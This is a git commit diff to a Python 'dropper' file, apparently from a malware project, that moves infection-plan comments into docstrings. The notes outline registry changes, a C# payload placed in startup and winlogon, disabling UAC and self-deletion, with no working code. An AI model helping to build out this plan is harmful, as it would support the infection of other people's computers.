b295b520d66fa980b463a76a20b75d316b7d1c4f
Pradhu007 <55123592+Pradhu007@users.noreply.github.com>
2022-10-30 10:11:36 +1100

    Update Messageboxalert.py

--- Dropper/Messageboxalert.py
+++ Dropper/Messageboxalert.py
@@ -47,21 +47,28 @@ if done == True:
         # Why bother when this system has been infected before...
     else:
         print("STARTING INFECTION NOW")
-        #1. Make the batch file  to do the registry changes ,write to and add the  C# payload to startup and winlogin.exe. Restart computer and clear batch
-        # of system done 
+        
+        """
+
+        1. Make the batch file  to do the registry changes ,write to and add the  C# payload to startup and winlogin.exe. Restart computer and self destruct 
+        batch 
+        
+        """
+        
+        
 
 
 
 
 
 
+"""
+  TODO
+  -Check if the user has been infected before by checking registry keys, files which are dropped by the c#/python/asm/batch payload
+  -if they have not been infected,  Do registry stuff with batch. eg. write the main payload bytes and add  to startup, disabling UAC, etc...., common stuff
+  -delete the python file because it is not needed anymore
+"""
 
-
-# Check if the user has been infected before by checking registry keys, files which are dropped by the c#/python/asm/batch payload
-# if they have not been infected,  Do registry stuff with batch. eg. write the main payload bytes and add  to startup, disabling UAC, etc...., common stuff
-# delete the python file because it is not needed anymore
-
-# and not bother smh....
 
 
 
